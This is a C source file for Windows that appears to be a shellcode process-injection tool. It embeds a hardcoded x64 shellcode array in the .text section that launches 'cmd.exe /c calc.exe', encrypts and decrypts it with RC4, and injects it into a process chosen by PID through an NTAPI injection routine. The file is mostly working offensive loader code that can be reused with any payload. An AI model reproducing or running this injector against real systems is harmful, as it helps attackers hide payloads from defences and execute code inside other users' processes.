#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "injector.h"

// RC4 context structure
typedef struct {
    unsigned int i;
    unsigned int j;
    unsigned char s[256];
} Rc4Context;

// RC4 initialization function
void rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {
    unsigned int i, j;
    unsigned char temp;

    if (context == NULL || key == NULL) return;

    context->i = 0;
    context->j = 0;

    for (i = 0; i < 256; i++) {
        context->s[i] = (unsigned char)i;
    }

    for (i = 0, j = 0; i < 256; i++) {
        j = (j + context->s[i] + key[i % length]) % 256;
        temp = context->s[i];
        context->s[i] = context->s[j];
        context->s[j] = temp;
    }
}

// RC4 cipher function
void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
    unsigned int i = context->i;
    unsigned int j = context->j;
    unsigned char temp;
    unsigned char* s = context->s;

    for (size_t k = 0; k < length; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
        output[k] = input[k] ^ s[(s[i] + s[j]) % 256];
    }

    context->i = i;
    context->j = j;
}

// Shellcode to be encrypted (in .text section)
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,
    0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
    0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
    0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
    0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
    0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
    0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
    0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
    0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
    0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
    0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
    0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
    0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
    0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
    0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
    0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
    0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
    0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
    0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
    0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00
};

// RC4 key
unsigned char key[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

int main(int argc, char* argv[]) {
    Rc4Context ctx;

    PrintBanner();
    // Encrypt shellcode
    size_t shellcodeSize = sizeof(Shellcode);
    unsigned char* encryptedShellcode = (unsigned char*)malloc(shellcodeSize);
    if (encryptedShellcode == NULL) {
        printf("Failed to allocate memory for encrypted shellcode.\n");
        return -1;
    }

    rc4Init(&ctx, key, sizeof(key));
    rc4Cipher(&ctx, Shellcode, encryptedShellcode, shellcodeSize);

    // Prompt user to decrypt before injection
    printf("[#] Press <Enter> To Decrypt...");
    getchar();

    // Decrypt shellcode
    unsigned char* decryptedShellcode = (unsigned char*)malloc(shellcodeSize);
    if (decryptedShellcode == NULL) {
        printf("Failed to allocate memory for decrypted shellcode.\n");
        free(encryptedShellcode);
        return -1;
    }

    rc4Init(&ctx, key, sizeof(key));
    rc4Cipher(&ctx, encryptedShellcode, decryptedShellcode, shellcodeSize);

    // Display plaintext shellcode (for verification)
    printf("[i] PlainText: \"%s\"\n", (char*)decryptedShellcode);

    // Perform process injection with decrypted shellcode
    if (argc < 2) {
        printf("Usage: %s [PID]\n", argv[0]);
        free(encryptedShellcode);
        free(decryptedShellcode);
        return EXIT_FAILURE;
    }

    if (!NTAPIInjection(atoi(argv[1]), decryptedShellcode, shellcodeSize)) {
        printf("Injection with NTAPI failed, exiting...\n");
        free(encryptedShellcode);
        free(decryptedShellcode);
        return EXIT_FAILURE;
    }

    printf("Successfully injected process with NTAPI!\n");

    // Clean up allocated memory
    free(encryptedShellcode);
    free(decryptedShellcode);

    return EXIT_SUCCESS;
}
